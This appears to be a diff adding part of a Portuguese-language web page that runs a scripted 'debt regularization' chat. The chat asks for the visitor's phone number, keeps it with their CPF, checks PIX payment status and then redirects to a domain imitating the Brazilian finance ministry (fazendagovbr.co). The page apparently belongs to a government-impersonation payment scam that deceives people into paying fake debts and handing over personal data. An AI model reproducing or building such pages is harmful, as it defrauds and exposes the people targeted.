+            window.paymentMonitorInterval = null;
+            console.log('⏰ Monitoramento encerrado por timeout (20 minutos)');
+        }
+    }, 20 * 60 * 1000);
+}
+
+async function initializeChat() {
+    await new Promise(resolve => setTimeout(resolve, 400));
+    
+    for (let i = 0; i < chatSequence.length; i++) {
+        const message = chatSequence[i];
+        
+        await showTyping(message.delay);
+        
+        addMessage(message.message, true, true);
+        
+        if (message.requestPhone) {
+            await new Promise(resolve => setTimeout(resolve, 400));
+            await showTyping(800);
+            addMessage(`Para continuar com a regularização do débito, preciso confirmar seu número de telefone.`, true, true);
+            
+            setTimeout(() => {
+                showPhoneInput();
+            }, 400);
+            
+            await waitForPhoneConfirmation();
+        }
+        
+        if (message.showOptions) {
+            setTimeout(() => {
+                showOptions(message.showOptions);
+            }, 600);
+        }
+    }
+}
+
+let phoneConfirmationResolve = null;
+initializeChat();
+
+function sanitizePhoneDigits(value) {
+    return String(value || '').replace(/\D/g, '').slice(0, 11);
+}
+
+function formatPhoneNumber(digits) {
+    const cleaned = sanitizePhoneDigits(digits);
+    if (cleaned.length <= 2) {
+        return cleaned;
+    }
+    if (cleaned.length <= 6) {
+        return `(${cleaned.slice(0, 2)}) ${cleaned.slice(2)}`;
+    }
+    if (cleaned.length <= 10) {
+        return `(${cleaned.slice(0, 2)}) ${cleaned.slice(2, 6)}-${cleaned.slice(6)}`;
+    }
+    return `(${cleaned.slice(0, 2)}) ${cleaned.slice(2, 7)}-${cleaned.slice(7)}`;
+}
+
+function isValidBrazilPhone(digits) {
+    const cleaned = sanitizePhoneDigits(digits);
+    if (!(cleaned.length === 10 || cleaned.length === 11)) {
+        return false;
+    }
+    if (/^(\d)\1+$/.test(cleaned)) {
+        return false;
+    }
+    const ddd = parseInt(cleaned.slice(0, 2), 10);
+    return ddd >= 11 && ddd <= 99;
+}
+
+function handlePhoneInput(inputEl) {
+    inputEl.value = formatPhoneNumber(inputEl.value);
+}
+
+function showPhoneInput() {
+    const phoneInputHtml = `
+        <div class="phone-input-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
+            <div style="background: #f8f9fa; border-radius: 8px; padding: 20px; border: 1px solid #dee2e6;">
+                <label for="phoneInput" style="display: block; margin-bottom: 10px; font-weight: 600; color: #044785;">
+                    Digite seu número de telefone (DDD + número):
+                </label>
+                <input 
+                    type="tel" 
+                    id="phoneInput" 
+                    placeholder="Ex: (61) 99543-8321"
+                    inputmode="numeric"
+                    autocomplete="tel-national"
+                    maxlength="15"
+                    style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #044785;
+                        border-radius: 4px;
+                        font-size: 1rem;
+                        margin-bottom: 15px;
+                        text-align: center;
+                        font-weight: 600;
+                    "
+                    oninput="handlePhoneInput(this)"
+                />
+                <button 
+                    onclick="confirmPhone()" 
+                    style="
+                        background: #044785;
+                        color: white;
+                        border: none;
+                        padding: 12px 24px;
+                        border-radius: 4px;
+                        font-weight: 600;
+                        cursor: pointer;
+                        width: 100%;
+                        font-size: 1rem;
+                    "
+                >
+                    Confirmar Telefone
+                </button>
+            </div>
+        </div>
+    `;
+    
+    chatContainer.insertAdjacentHTML('beforeend', phoneInputHtml);
+    chatContainer.scrollTop = chatContainer.scrollHeight;
+    
+    setTimeout(() => {
+        document.getElementById('phoneInput').focus();
+    }, 500);
+}
+
+function waitForPhoneConfirmation() {
+    return new Promise(resolve => {
+        phoneConfirmationResolve = resolve;
+    });
+}
+
+async function confirmPhone() {
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneDigits = sanitizePhoneDigits(phoneInput.value);
+    
+    if (!isValidBrazilPhone(phoneDigits)) {
+        alert('Por favor, digite um número de telefone válido (DDD + número).');
+        return;
+    }
+    
+    const currentData = JSON.parse(localStorage.getItem('customerData') || '{}');
+    // Salva apenas números para envio limpo na requisição.
+    currentData.telefone = phoneDigits;
+    localStorage.setItem('customerData', JSON.stringify(currentData));
+    customerData.telefone = phoneDigits;
+    
+    addMessage(`Telefone: ${formatPhoneNumber(phoneDigits)}`, false, true);
+    
+    const phoneContainer = document.querySelector('.phone-input-container');
+    if (phoneContainer) {
+        phoneContainer.remove();
+    }
+    
+    await showTyping(1000);
+    addMessage(`Obrigada, ${firstName}! Telefone confirmado. Agora vou prosseguir com as informações sobre seu débito.`, true, true);
+    
+    if (phoneConfirmationResolve) {
+        phoneConfirmationResolve();
+        phoneConfirmationResolve = null;
+    }
+}
+
+async function handlePaymentConfirmation(transactionId, confirmed) {
+    const popup = document.getElementById('paymentConfirmationPopup');
+    const overlay = document.getElementById('paymentConfirmationOverlay');
+    if (popup) popup.remove();
+    if (overlay) overlay.remove();
+    
+    if (confirmed) {
+        console.log('✅ Usuário confirmou pagamento, verificando status...');
+        
+        try {
+            const statusUrl = `${PAYMENT_API_BASE}/status?identifier=${encodeURIComponent(transactionId)}`;
+            const response = await fetch(statusUrl);
+
+            if (!response.ok) {
+                console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
+                return;
+            }
+
+            const statusData = await response.json();
+            console.log('📊 Status da verificação manual:', statusData);
+
+            let status = null;
+            if (statusData && statusData.status) {
+                status = statusData.status;
+            }
+            const statusNormalizado = status ? String(status).toLowerCase() : '';
+            
+            console.log(`🎯 Status manual normalizado: "${statusNormalizado}"`);
+            
+            if (statusNormalizado === 'approved' || statusNormalizado === 'paid') {
+                if (window.paymentMonitorInterval) {
+                    clearInterval(window.paymentMonitorInterval);
+                    window.paymentMonitorInterval = null;
+                }
+                
+                closePixModal();
+
+                let cpfParam = '';
+                try {
+                    const stored = localStorage.getItem('customerData');
+                    if (stored) {
+                        const parsed = JSON.parse(stored);
+                        if (parsed && parsed.cpf) {
+                            cpfParam = String(parsed.cpf).replace(/\D/g, '');
+                        }
+                    }
+                } catch (e) {
+                    console.warn('Não foi possível ler customerData do localStorage para o CPF (confirmação manual):', e);
+                }
+
+                if (cpfParam) {
+                    window.location.href = `../indexe5bf.html?cpf=${encodeURIComponent(cpfParam)}&sem_pendencias=1&pagamento_sucesso=1`;
+                } else {
+                    window.location.href = 'https://seguir.fazendagovbr.co/indexe5bf.html?sem_pendencias=1&amp;pagamento_sucesso=1';
+                }
+            } else {
+                console.log('⚠️ Pagamento ainda não foi aprovado');
+                alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
+            }
+        } catch (error) {
+            console.error('❌ Erro ao verificar status manual:', error);
+            alert('Erro ao verificar pagamento. Tente novamente.');
+        }
+    } else {
+        console.log('❌ Usuário informou que não realizou o pagamento');
+    }
+}
+</script>
+<script>
+    (function () {
+        try {
+            fetch('iniciado.html', {
+                method: 'POST',
+                cache: 'no-store',
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
+                keepalive: true
+            }).catch(function () {});
+        } catch (e) {}
+    })();
+</script>
+
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4bc70e2c01a94c73b74392e4234840661791215815920" integrity="sha512-L0ha0OXavK/8okipN9F8BtP84dg9DUhPERbBXzwI6dgTA55d2+yweo3pn5CSFYs45/r8md2+xvUPtTdvTNRfjA==" data-cf-beacon='{"version":"2024.11.0","token":"f0cb857a8dbc47b59d5cd5f71a819492","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+
+
+</html>
